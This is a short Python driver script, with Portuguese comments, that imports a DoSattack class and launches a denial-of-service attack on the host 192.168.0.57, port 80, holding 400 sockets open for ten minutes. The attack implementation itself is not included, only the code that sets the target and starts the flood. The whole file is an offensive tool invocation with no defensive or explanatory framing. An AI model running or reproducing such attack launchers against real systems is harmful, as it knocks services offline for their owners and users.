from DoSattack import DoSattack
if __name__ == "__main__":
    dos = DoSattack("192.168.0.57", 80, socketsCount=400) #define o alvo e contador de socket
    dos.attack(timeout=10*60) #em segundos
            
    
